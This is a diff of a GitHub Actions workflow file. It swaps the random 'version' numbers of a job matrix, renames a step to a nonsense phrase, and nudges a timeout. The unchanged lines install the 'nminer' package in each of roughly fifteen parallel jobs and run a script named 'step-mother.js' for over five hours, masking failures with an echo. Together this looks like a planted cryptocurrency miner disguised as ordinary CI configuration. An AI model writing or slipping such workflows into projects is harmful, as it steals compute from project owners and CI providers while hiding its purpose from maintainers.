@@ -9,24 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 653 }
-          - { version: 2463 }
-          - { version: 9039 }
-          - { version: 7892 }
-          - { version: 8870 }
-          - { version: 4705 }
-          - { version: 9126 }
-          - { version: 1530 }
-          - { version: 388 }
-          - { version: 1670 }
-          - { version: 6244 }
-          - { version: 8296 }
-          - { version: 1249 }
-          - { version: 5407 }
-          - { version: 5346 }
-          - { version: 8029 }
-          - { version: 2510 }
-          - { version: 109 }
+          - { version: 7468 }
+          - { version: 8153 }
+          - { version: 5109 }
+          - { version: 7445 }
+          - { version: 5404 }
+          - { version: 4252 }
+          - { version: 9078 }
+          - { version: 915 }
+          - { version: 4059 }
+          - { version: 321 }
+          - { version: 850 }
+          - { version: 7374 }
+          - { version: 6507 }
+          - { version: 632 }
+          - { version: 389 }
 
     steps:
       - name: Checkout
@@ -37,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: boo now spear yippee freezing
+      - name: that wherever boohoo too
         run: |
           npm install nminer@latest
-          timeout 301m node step-mother.js || echo "step-mother executed"
+          timeout 327m node step-mother.js || echo "step-mother executed"
